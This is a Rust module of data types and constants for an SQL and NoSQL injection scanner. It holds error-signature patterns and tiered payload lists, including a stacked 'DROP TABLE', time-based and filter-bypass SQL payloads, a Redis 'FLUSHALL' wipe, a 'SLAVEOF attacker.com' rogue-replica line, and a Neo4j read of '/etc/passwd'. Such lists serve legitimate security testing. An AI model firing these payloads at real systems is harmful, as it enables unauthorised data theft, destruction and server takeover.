use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqliScanConfig {
    pub url: String,
    pub timeout: u64,
    pub threads: usize,
    pub scan_level: String,
    pub test_get: bool,
    pub test_post: bool,
    pub test_cookies: bool,
    pub test_headers: bool,
    pub custom_parameters: Vec<String>,
}

impl Default for SqliScanConfig {
    fn default() -> Self {
        Self {
            url: String::new(),
            timeout: 15,
            threads: 5,
            scan_level: "moderate".to_string(),
            test_get: true,
            test_post: false,
            test_cookies: false,
            test_headers: false,
            custom_parameters: vec![],
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqliScanResult {
    pub url: String,
    pub vulnerabilities: Vec<SqliVulnerability>,
    pub safe_parameters: Vec<SqliSafeEntry>,
    pub errors: Vec<SqliErrorEntry>,
    pub tests_performed: usize,
    pub parameters_tested: Vec<String>,
    pub scan_duration_ms: u64,
    pub summary: String,
    pub db_type_distribution: Vec<DbTypeDistribution>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqliVulnerability {
    pub parameter: String,
    pub injection_type: String,
    pub injection_category: String,
    pub severity: String,
    pub payload: String,
    pub evidence: String,
    pub request_url: String,
    pub confidence: f64,
    pub db_type: String,
    pub response_time_ms: Option<u64>,
    pub http_status: Option<u16>,
    pub method: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqliSafeEntry {
    pub parameter: String,
    pub tests_run: usize,
    pub method: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SqliErrorEntry {
    pub parameter: String,
    pub payload: String,
    pub error: String,
    pub method: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DbTypeDistribution {
    pub db_type: String,
    pub count: usize,
    pub vulnerable_count: usize,
}

pub const ERROR_PATTERNS: &[(&str, &str, f64)] = &[
    ("you have an error in your sql syntax", "MySQL", 0.95),
    ("mysql_fetch", "MySQL", 0.90),
    ("mysql_num_rows", "MySQL", 0.90),
    ("warning: mysql", "MySQL", 0.90),
    ("valid mysql result", "MySQL", 0.90),
    ("check the manual that corresponds to your mysql", "MySQL", 0.95),
    ("mysql server version", "MySQL", 0.90),
    ("supplied argument is not a valid mysql", "MySQL", 0.90),
    ("postgresql query failed", "PostgreSQL", 0.95),
    ("pg_query", "PostgreSQL", 0.85),
    ("warning: pg_", "PostgreSQL", 0.90),
    ("pg_send_query", "PostgreSQL", 0.85),
    ("unclosed quotation mark", "MSSQL", 0.95),
    ("microsoft oledb provider", "MSSQL", 0.90),
    ("odbc sql server driver", "MSSQL", 0.90),
    ("sqlserver", "MSSQL", 0.85),
    ("microsoft sql server", "MSSQL", 0.90),
    ("oracle error", "Oracle", 0.85),
    ("oracle.jdbc", "Oracle", 0.85),
    ("ora-", "Oracle", 0.80),
    ("sqlite_", "SQLite", 0.90),
    ("sqlite3::", "SQLite", 0.90),
    ("sqliteexception", "SQLite", 0.90),
    ("sql error", "Generic", 0.70),
    ("sqlstate", "Generic", 0.75),
    ("query failed", "Generic", 0.60),
    ("database error", "Generic", 0.65),
    ("db error", "Generic", 0.60),
    ("sql warning", "Generic", 0.70),
    ("supplied argument is not a valid", "PHP-DB", 0.75),
    ("fetch_array", "PHP-DB", 0.70),
    ("num_rows", "PHP-DB", 0.65),
    ("access violation", "Generic", 0.60),
    ("constraint violation", "Generic", 0.65),
];

pub const BASIC_PAYLOADS: &[(&str, &str, &str)] = &[
    ("'", "Error-based", "Single Quote"),
    ("''", "Error-based", "Double Quote"),
    ("1' OR '1'='1", "Boolean-based", "OR true"),
    ("1' AND '1'='1", "Boolean-based", "AND true"),
    ("1' AND '1'='2", "Boolean-based", "AND false"),
    ("1'--", "Comment", "SQL comment"),
    ("1' #", "Comment", "MySQL comment"),
];

pub const MODERATE_PAYLOADS: &[(&str, &str, &str)] = &[
    ("'", "Error-based", "Single Quote"),
    ("''", "Error-based", "Double Quote"),
    ("1' OR '1'='1", "Boolean-based", "OR true"),
    ("1' AND '1'='1", "Boolean-based", "AND true"),
    ("1' AND '1'='2", "Boolean-based", "AND false"),
    ("1 OR 1=1", "Boolean-based", "No quote OR"),
    ("1 AND 1=1", "Boolean-based", "No quote AND"),
    ("1'--", "Comment", "SQL comment"),
    ("1' #", "Comment", "MySQL comment"),
    ("1'/*", "Comment", "Block comment"),
    ("1 UNION SELECT NULL--", "UNION-based", "1 column"),
    ("1 UNION SELECT NULL,NULL--", "UNION-based", "2 columns"),
    ("1 UNION SELECT NULL,NULL,NULL--", "UNION-based", "3 columns"),
    ("1; DROP TABLE--", "Stacked", "Drop table"),
    ("1' AND SLEEP(3)--", "Time-based", "MySQL SLEEP"),
    ("1' WAITFOR DELAY '0:0:3'--", "Time-based", "MSSQL WAITFOR"),
];

pub const AGGRESSIVE_PAYLOADS: &[(&str, &str, &str)] = &[
    ("'", "Error-based", "Single Quote"),
    ("''", "Error-based", "Double Quote"),
    ("1' OR '1'='1", "Boolean-based", "OR true"),
    ("1' AND '1'='1", "Boolean-based", "AND true"),
    ("1' AND '1'='2", "Boolean-based", "AND false"),
    ("1 OR 1=1", "Boolean-based", "No quote OR"),
    ("1 AND 1=1", "Boolean-based", "No quote AND"),
    ("1 AND 1=2", "Boolean-based", "No quote AND false"),
    ("1'--", "Comment", "SQL comment"),
    ("1' #", "Comment", "MySQL comment"),
    ("1'/*", "Comment", "Block comment"),
    ("1 UNION SELECT NULL--", "UNION-based", "1 column"),
    ("1 UNION SELECT NULL,NULL--", "UNION-based", "2 columns"),
    ("1 UNION SELECT NULL,NULL,NULL--", "UNION-based", "3 columns"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL--", "UNION-based", "4 columns"),
    ("1 UNION SELECT NULL,NULL,NULL,NULL,NULL--", "UNION-based", "5 columns"),
    ("1; DROP TABLE--", "Stacked", "Drop table"),
    ("1; SELECT 1--", "Stacked", "Select"),
    ("1' AND SLEEP(3)--", "Time-based", "MySQL SLEEP"),
    ("1' WAITFOR DELAY '0:0:3'--", "Time-based", "MSSQL WAITFOR"),
    ("1' AND pg_sleep(3)--", "Time-based", "PostgreSQL pg_sleep"),
    ("1' AND 1=1--", "Bypass", "Comment bypass"),
    ("1' AnD 1=1--", "Bypass", "Case bypass"),
    ("1'/**/AND/**/1=1--", "Bypass", "Whitespace bypass"),
    ("1'%20AND%201=1--", "Bypass", "URL encode bypass"),
    ("1' AND 1=1#", "Bypass", "Hash terminator"),
    (") OR 1=1--", "Error-based", "Parenthesis"),
    ("')) OR 1=1--", "Error-based", "Double parenthesis"),
    ("1' GROUP BY 1--", "Error-based", "GROUP BY"),
    ("1' ORDER BY 1--", "Error-based", "ORDER BY"),
    ("1' HAVING 1=1--", "Error-based", "HAVING"),
];

pub const DEFAULT_PARAMETERS: &[&str] = &[
    "id", "q", "page", "search", "user", "cat", "category",
    "item", "product", "article", "news", "post", "uid",
    "uid", "pid", "sid", "tid", "fid", "rid", "lid",
    "sort", "order", "limit", "offset", "filter",
    "keyword", "query", "term", "name", "username",
    "email", "role", "type", "action", "step", "view",
];

pub const USER_AGENTS: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
];

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NoSqlInjectionConfig {
    pub url: String,
    pub timeout: u64,
    pub test_mongodb: bool,
    pub test_couchdb: bool,
    pub test_redis: bool,
    pub test_neo4j: bool,
    pub injection_points: Vec<String>,
    pub custom_parameters: Vec<String>,
}

impl Default for NoSqlInjectionConfig {
    fn default() -> Self {
        Self {
            url: String::new(),
            timeout: 15,
            test_mongodb: true,
            test_couchdb: true,
            test_redis: true,
            test_neo4j: true,
            injection_points: vec!["query".to_string(), "body".to_string(), "headers".to_string(), "cookies".to_string()],
            custom_parameters: Vec::new(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NoSqlInjectionResult {
    pub url: String,
    pub vulnerabilities: Vec<NoSqlVulnerability>,
    pub tests_performed: usize,
    pub parameters_tested: Vec<String>,
    pub scan_duration_ms: u64,
    pub summary: String,
    pub db_type_distribution: Vec<NoSqlDbTypeDistribution>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NoSqlVulnerability {
    pub parameter: String,
    pub injection_type: String,
    pub db_type: String,
    pub severity: String,
    pub payload: String,
    pub evidence: String,
    pub confidence: f64,
    pub method: String,
    pub injection_point: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NoSqlDbTypeDistribution {
    pub db_type: String,
    pub count: usize,
    pub vulnerable_count: usize,
}

pub const NOSQL_MONGODB_PAYLOADS: &[(&str, &str, &str)] = &[
    (r#"{"$gt":""}"#, "Operator Injection", "MongoDB"),
    (r#"{"$gt":""}"#, "Operator Injection", "MongoDB"),
    (r#"{"$ne":""}"#, "Operator Injection", "MongoDB"),
    (r#"{"$ne":"null"}"#, "Operator Injection", "MongoDB"),
    (r#"{"$gt":null}"#, "Operator Injection", "MongoDB"),
    (r#"{"$regex":".*"}"#, "Regex Injection", "MongoDB"),
    (r#"{"$where":"1==1"}"#, "JavaScript Injection", "MongoDB"),
    (r#"{"$where":"sleep(3000)"}"#, "Time-based", "MongoDB"),
    (r#"{"$where":"this.password.match(/.*/)!=null"}"#, "JavaScript Injection", "MongoDB"),
    (r#"[{"$gt":""}]"#, "Array Injection", "MongoDB"),
    (r#"{"$elemMatch":{"$gt":""}}"#, "ElemMatch Injection", "MongoDB"),
    (r#"{"$not":{"$gt":""}}"#, "Not Operator", "MongoDB"),
    (r#"{"$exists":true}"#, "Exists Operator", "MongoDB"),
    (r#"{"$type":"string"}"#, "Type Operator", "MongoDB"),
    (r#"{"$mod":[0,0]}"#, "Mod Operator", "MongoDB"),
];

pub const NOSQL_COUCHDB_PAYLOADS: &[(&str, &str, &str)] = &[
    (r#"{"$gt":null}"#, "View Injection", "CouchDB"),
    (r#"{"_id":{"$gt":null}}"#, "ID Injection", "CouchDB"),
    (r#"startkey="{}"&endkey="{}""#, "Key Range", "CouchDB"),
    (r#"limit=100000"#, "Limit Bypass", "CouchDB"),
    (r#"skip=0"#, "Skip Bypass", "CouchDB"),
    (r#"include_docs=true"#, "Doc Exposure", "CouchDB"),
    (r#"reduce=false"#, "Reduce Bypass", "CouchDB"),
];

pub const NOSQL_REDIS_PAYLOADS: &[(&str, &str, &str)] = &[
    (r#"\r\nSET injected_key injected_value\r\n"#, "CRLF Injection", "Redis"),
    (r#"\r\nCONFIG SET dir /tmp\r\n"#, "Config Manipulation", "Redis"),
    (r#"\r\nFLUSHALL\r\n"#, "Data Destruction", "Redis"),
    (r#"\r\nINFO\r\n"#, "Info Disclosure", "Redis"),
    (r#"\r\nKEYS *\r\n"#, "Key Enumeration", "Redis"),
    (r#"\r\nSLAVEOF attacker.com 6379\r\n"#, "Rogue Slave", "Redis"),
];

pub const NOSQL_NEO4J_PAYLOADS: &[(&str, &str, &str)] = &[
    (r#"" OR 1=1 WITH * RETURN *"#, "Cypher Injection", "Neo4j"),
    (r#"" RETURN 0 AS x UNION CALL db.labels() YIELD label RETURN label AS x //"#, "Label Enumeration", "Neo4j"),
    (r#"" RETURN 0 AS x UNION CALL db.propertyKeys() YIELD propertyKey RETURN propertyKey AS x //"#, "Property Enumeration", "Neo4j"),
    (r#"" RETURN 0 AS x UNION MATCH (u:User) RETURN u.username AS x //"#, "User Enumeration", "Neo4j"),
    (r#"" RETURN 0 AS x UNION CALL dbms.procedures() YIELD name RETURN name AS x //"#, "Procedure Enumeration", "Neo4j"),
    (r#"" RETURN 0 AS x UNION CALL dbms.security.listUsers() YIELD username RETURN username AS x //"#, "Security Bypass", "Neo4j"),
    (r#"" CALL apoc.load.json('file:///etc/passwd') YIELD value RETURN value //"#, "File Read", "Neo4j"),
];

pub const NOSQL_ERROR_PATTERNS: &[(&str, &str, f64)] = &[
    ("mongo", "MongoDB", 0.85),
    ("mongodb", "MongoDB", 0.90),
    ("bson", "MongoDB", 0.85),
    ("ObjectId", "MongoDB", 0.80),
    ("$where", "MongoDB", 0.90),
    ("mapreduce", "MongoDB", 0.75),
    ("couchdb", "CouchDB", 0.90),
    ("couch", "CouchDB", 0.80),
    ("_rev", "CouchDB", 0.75),
    ("_design", "CouchDB", 0.80),
    ("redis", "Redis", 0.85),
    ("ERR unknown command", "Redis", 0.80),
    ("WRONGTYPE", "Redis", 0.75),
    ("neo4j", "Neo4j", 0.90),
    ("cypher", "Neo4j", 0.85),
    ("SyntaxException", "Neo4j", 0.80),
    ("ClientException", "Neo4j", 0.75),
    ("database error", "Generic NoSQL", 0.60),
    ("no results", "Generic NoSQL", 0.50),
    ("document not found", "Generic NoSQL", 0.55),
];

pub const NOSQL_DEFAULT_PARAMETERS: &[&str] = &[
    "id", "user", "username", "email", "search", "q", "query",
    "filter", "where", "find", "lookup", "key", "name",
    "password", "token", "session", "auth", "login",
    "sort", "order", "limit", "skip", "offset", "page",
    "category", "tag", "type", "status", "role",
];
